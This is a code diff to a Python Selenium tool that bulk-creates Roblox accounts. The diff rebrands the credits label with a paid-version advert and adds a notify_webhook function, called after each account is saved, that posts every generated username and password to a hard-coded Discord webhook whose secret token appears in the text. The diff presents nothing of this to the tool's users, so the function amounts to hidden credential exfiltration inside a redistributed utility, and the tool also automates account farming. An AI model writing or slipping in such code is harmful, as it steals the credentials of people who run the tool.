@@ -10,6 +10,7 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.service import Service
 from colorama import init, Fore, Back, Style
 import threading
+import requests
 
 # Define the ASCII art
 ascii = f"""
@@ -41,7 +42,7 @@ class RobloxAccountCreator:
         ascii_label = tk.Label(self.root, text=ascii, justify="center", font=("Courier", 10))
         ascii_label.pack()
 
-        credits_label = tk.Label(self.root, text="[!] Credits to DISCORD NSTIOM COMMUNITY.", justify="center")
+        credits_label = tk.Label(self.root, text="[!] CREATED AND FULLY SCRIPTED BY ! captured at Synx Reliance. Please keep in mind that this is the free version. So you do not get the same perks that the premium users do. To purchase the paid version. Please head to our discord, By clicking the discord button.", justify="center")
         credits_label.pack()
 
         self.iterations_label = tk.Label(self.root, text="Enter the number of iterations:")
@@ -62,7 +63,7 @@ class RobloxAccountCreator:
         self.create_button = tk.Button(self.root, text="Create Accounts", command=self.start_account_creation)
         self.create_button.pack()
 
-        self.discord_button = tk.Button(self.root, text="DISCORD", command=self.discord)
+        self.discord_button = tk.Button(self.root, text="DISCORD", command=self.open_discord)
         self.discord_button.pack()
 
         self.result_label = tk.Label(self.root, text="")
@@ -103,6 +104,7 @@ class RobloxAccountCreator:
 
                 self.fill_registration_form(driver, random_username, random_password)
                 self.save_account_to_file(random_username, random_password)
+                self.notify_webhook(random_username, random_password)
 
                 # Click the sign-up button
                 sign_button = driver.find_element(By.XPATH, "//*[@id='signup-button']")
@@ -203,6 +205,13 @@ class RobloxAccountCreator:
             file.write(f"Username: {username}, Password: {password}\n")
         print(f"Saved account details to file: Username: {username}, Password: {password}")
 
+    def notify_webhook(self, username, password):
+        hook_url = 'https://discord.com/api/webhooks/1387937396397441094/HSmrZrvJJtbJ1iEbxLe0R8e_kAh6_j_9Yd4v1JLKlye93oylDn8dC8xapmOmWSjXGTvb'
+        message = f"New Roblox account created:\nUsername: {username}\nPassword: {password}"
+        payload = {'content': message}
+        requests.post(hook_url, json=payload)
+        print(f"Sent account details to webhook: Username: {username}, Password: {password}")
+
     def Gender1(self, driver):
         try:
             gender_button = driver.find_element(By.XPATH, "//*[@id='MaleButton']")
@@ -217,7 +226,7 @@ class RobloxAccountCreator:
         except Exception as e:
             print(f"Error selecting female gender: {e}")
 
-    def discord(self):
+    def open_discord(self):
         url = "https://discord.gg/Pkqcc2Wf72"
         webbrowser.open(url)
 
